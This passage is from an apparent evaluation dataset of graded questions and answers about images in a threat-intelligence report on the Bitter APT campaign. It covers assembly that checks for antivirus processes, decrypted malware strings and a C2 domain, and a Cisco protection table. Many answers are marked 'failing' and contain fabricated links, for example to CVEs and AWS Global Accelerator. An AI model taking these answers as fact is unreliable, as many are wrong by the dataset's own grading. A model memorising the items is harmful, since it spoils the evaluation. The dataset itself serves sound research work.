+                    "answer": "The tactics of network proxying (T1090-Proxy) might be reflected in the domain activities shown in the image by the repeated use of similar domains across different months to potentially obscure the origin of traffic.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What could be the reasons for the selection of these specific domains by the Bitter APT actor?",
+                    "answer": "The reasons for the selection of these specific domains by the Bitter APT actor could be for phishing or malware distribution.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "Which vulnerabilities might be exploited in connection with the domains listed in the image?",
+                    "answer": "The vulnerabilities might be related to SSL certificate misconfigurations or phishing.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What does the presence of multiple domain names over consecutive months indicate about the campaign's strategy?",
+                    "answer": "The presence of multiple domain names over consecutive months indicates the campaign's strategy involves continuous domain generation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Ways our customers can detect and block this threat are listed below.PNG",
+            "pic_type": "Data Table",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content of the image is a list of Cisco security products and their protection status.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are to illustrate the range of protection offered by Cisco security products.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve endpoint compromise, email phishing, network intrusion, malware analysis evasion, and web-based attacks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the fields highlighted in the image?",
+                    "answer": "The fields highlighted in the image are \"Product\" and \"Protection.\"",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible informations relevant to malicious activity in the image?",
+                    "answer": "The possible informations relevant to malicious activity in the image are Cisco Secure Endpoint, Cisco Secure Email, Cisco Secure Firewall/Secure IPS, Cisco Secure Malware Analytics, Umbrella, and Cisco Secure Web Appliance.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the specific products listed in the image?",
+                    "answer": "The specific products listed in the image are Cisco Secure Endpoint (AMP for Endpoints), Cloudlock, Cisco Secure Email, Cisco Secure Firewall/Secure IPS (Network Security), Cisco Secure Malware Analytics (Threat Grid), Umbrella, and Cisco Secure Web Appliance (Web Security Appliance).",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the meaning of the check marks in the protection column?",
+                    "answer": "The check marks in the protection column indicate the presence of protection for the corresponding Cisco Secure product.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "Which product in the image does not offer protection?",
+                    "answer": "The product that does not offer protection is Cloudlock.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What kinds of protection do these products aim to provide?",
+                    "answer": "The kinds of protection aim to provide endpoint security, email security, network security, malware analytics, and web security.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "How is the information in the image organized and categorized?",
+                    "answer": "The information in the image is organized and categorized by product and their corresponding protection status.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What could be the significance of 'N/A' mentioned in the image?",
+                    "answer": "The significance of 'N/A' mentioned in the image is that Cloudlock's protection status is not applicable or not available.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of CVE identifiers in the context of the image?",
+                    "answer": "The significance of CVE identifiers in the context of the image is not specified.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the role of phishing tactics as depicted in the image?",
+                    "answer": "The role of phishing tactics is not depicted in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the implications of targeting Bangladesh's governmental networks mentioned in the image?",
+                    "answer": "The image does not mention the implications of targeting Bangladesh's governmental networks.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does AWS Global Accelerator feature in the protection strategy in the image?",
+                    "answer": "AWS Global Accelerator does not feature in the protection strategy in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the relevance of themed lure documents in the image?",
+                    "answer": "The relevance of themed lure documents is not mentioned in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does network proxying relate to the protections shown in the image?",
+                    "answer": "Network proxying relates to the protections shown in the image by potentially involving Cisco Secure Web Appliance (Web Security Appliance).",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How do the products listed in the image help evade detection?",
+                    "answer": "The products listed in the image help evade detection by providing various forms of security protection.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the connection between the C2 server and the products in the image?",
+                    "answer": "The connection is that the C2 server may be targeted or protected by the security products listed.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "WinMain function snippet.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is assembly code invoking functions to manipulate strings and files.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing malware behavior and reverse engineering.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve code obfuscation and registry manipulation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function of the zCode in the image is to manipulate strings and perform operations based on the retrieved module file name.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What programming language is used in the image?",
+                    "answer": "The programming language used is Assembly.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the role of 'GetModuleFileNameA' in the image?",
+                    "answer": "The role of 'GetModuleFileNameA' is to retrieve the fully qualified path of the executable.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What does the 'push' operation do in this code?",
+                    "answer": "The 'push' operation pushes a value onto the stack.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the potential implications of the specific function calls shown in the image?",
+                    "answer": "The potential implications include unauthorized access to system files and registry modifications.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the hexadecimal values in the image?",
+                    "answer": "The significance of the hexadecimal values is for memory addressing and data manipulation in the assembly code.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the security risks associated with the code in the image?",
+                    "answer": "The security risks associated with the code in the image include potential unauthorized access to system files and execution of malicious commands.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the environment in which this code is likely to run?",
+                    "answer": "The environment is likely a Windows operating system.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the purpose of the comments in this code snippet?",
+                    "answer": "The purpose of the comments is to provide information about the parameters being pushed and the addresses being called.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the threat actor utilize AWS Global Accelerator in the context of this code?",
+                    "answer": "The threat actor utilizes AWS Global Accelerator by invoking functions to manipulate strings and file paths, potentially for obfuscation or configuration retrieval.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities such as CVE-2017-11882, CVE-2018-0798, or CVE-2018-0802 could be exploited by the code in the image?",
+                    "answer": "The vulnerabilities that could be exploited by the code in the image are CVE-2017-11882, CVE-2018-0798, or CVE-2018-0802.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How might the code be used to target government entities like Bangladesh's Rapid Action Battalion?",
+                    "answer": "The code might be used to target government entities like Bangladesh's Rapid Action Battalion by exploiting vulnerabilities to execute malicious actions.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the relationship between the code in the image and the command and control server described in the knowledge graph?",
+                    "answer": "The relationship is that the code in the image likely communicates with the command and control server described in the knowledge graph.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "WinMain() snippet showing antivirus process detection.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is assembly code checking for running processes related to security software.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing malware behavior and detecting antivirus software.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve checking for the presence of security processes \"MsMp\" and \"Kaspersky_Process\" to potentially evade detection.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function is to check for the presence of specific antivirus processes.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What programming language is used in the image?",
+                    "answer": "The programming language used is Assembly.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What processes are identified in the image?",
+                    "answer": "The processes identified are \"Windefender_Process\" and \"Kaspersky_Process.\"",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "Where are the conditional operations performed in the image?",
+                    "answer": "The conditional operations are performed at loc_4012C0, loc_4012E8, and loc_4012F0.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the offsets used in the image?",
+                    "answer": "The significance of the offsets is to locate specific processes for antivirus software.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the image illustrate the exploitation of vulnerabilities like CVE-2017-11882 and CVE-2018-0798?",
+                    "answer": "The image illustrates the exploitation by checking for and targeting specific antivirus processes, potentially leveraging vulnerabilities like CVE-2017-11882 and CVE-2018-0798.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the relationship between the image and the AWS Global Accelerator in the attack campaign?",
+                    "answer": "The relationship between the image and the AWS Global Accelerator in the attack campaign is not specified.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "Which infrastructure components depicted in the image are part of the C2 server operations?",
+                    "answer": "The infrastructure components are \"Windefender_Process\" and \"Kaspersky_Process.\"",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the code in the image facilitate the execution of further malicious files?",
+                    "answer": "The code facilitates the execution of further malicious files by checking for and interacting with specific antivirus processes to potentially disable them.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "In what way does the image demonstrate the tactics used for masquerading as legitimate software?",
+                    "answer": "The image demonstrates the tactics used for masquerading as legitimate software by showing code that attempts to find and interact with processes associated with known antivirus software, potentially to evade detection.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "第4页-5.PNG",
+            "pic_type": "Data Table",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a list of encrypted and decrypted strings.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article from TALOS.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing encrypted and decrypted strings in a cyber threat context.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve encrypted strings for obfuscation and decrypted paths and commands for execution.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What are the fields highlighted in the image?",
+                    "answer": "The fields highlighted in the image are \"Encrypted strings\" and \"Decrypted strings\".",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible informations relevant to malicious activity in the image?",
+                    "answer": "The possible informations relevant to malicious activity are \"update.exe\", \"Updates\", \"C:\\\\ProgramData\\\\Windows\", \"xnb/dxagt5avbB2.php?txt=\", \"data1.php?id=\", \"GET /dFFrt3856ByutTs/\", and \"helpdesk.autodefragapp.com\".",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the context of the 'Encrypted strings' in the image?",
+                    "answer": "The context of the 'Encrypted strings' is cyber threat intelligence.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the significance of the 'Decrypted strings' shown in the image?",
+                    "answer": "The significance of the 'Decrypted strings' shown in the image is to reveal the actual content or commands that were originally obfuscated.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the relationship between each encrypted and decrypted string pair in the image?",
+                    "answer": "The relationship is that each encrypted string corresponds to a specific decrypted string.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What organization or entity is associated with the logo present in the image?",
+                    "answer": "The organization associated with the logo is TALOS.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What could be the potential impact of the information presented in the image?",
+                    "answer": "The potential impact could involve unauthorized updates and data exfiltration.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities (CVE IDs) are associated with the attack as depicted in the image?",
+                    "answer": "No CVE IDs are provided in the image.",
+                    "qlabel1": "yes",
+                    "qlabel2": "no",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of AWS Global Accelerator in this image?",
+                    "answer": "There is no significance of AWS Global Accelerator in this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What tactics to mask activities are highlighted in the image?",
+                    "answer": "The tactics to mask activities highlighted in the image include using encrypted strings for file names, update notifications, and URLs.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the relevance of the C2 server infrastructure shown in the image?",
+                    "answer": "The relevance of the C2 server infrastructure shown in the image is for updating and communicating with infected systems.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the importance of 'network proxying (T1090-Proxy)' techniques related to the image?",
+                    "answer": "The importance of 'network proxying (T1090-Proxy)' techniques related to the image is to facilitate communication through legitimate channels for command and control operations.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        }
+    ]
+}
